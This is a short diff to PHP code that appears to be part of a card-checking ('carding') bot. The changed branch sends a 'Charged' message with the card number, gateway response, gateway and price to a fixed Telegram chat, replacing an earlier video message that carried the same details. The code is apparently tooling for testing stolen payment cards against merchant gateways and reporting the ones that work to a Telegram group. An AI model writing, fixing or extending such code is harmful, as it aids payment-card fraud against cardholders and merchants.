@@ -1660,13 +1660,10 @@ if (
         'Gateway' => $gateway,
         'cc' => $cc1,
     ]);
-    $kb_s = [
-        'caption' => "
-Card: $cc1
-Response: $err
-Gateway: $gateway
-Price: $totalamt
-        ",
+    $chat_id1 = '-1003238480673';
+    output('sendMessage', [
+        'chat_id' => $chat_id1,
+        'text' => "<b>Charged</b>\n\nCard: <code>$cc1</code>\nResponse: $err\nGateway: $gateway\nPrice: $totalamt",
         'reply_markup' => json_encode([
             'inline_keyboard' => [
                 [
@@ -1677,12 +1674,7 @@ Price: $totalamt
                 ]
             ]
         ])
-    ];
-    $chat_id1 = '-1003238480673';
-    output('sendVideo', array_merge([
-        'chat_id' => $chat_id1,
-        'video' => 'https://t.me/amanpan/1'
-    ], $kb_s));
+    ]);
     echo $result;
     exit;
 } elseif (strpos($response5, 'CompletePaymentChallenge')) {
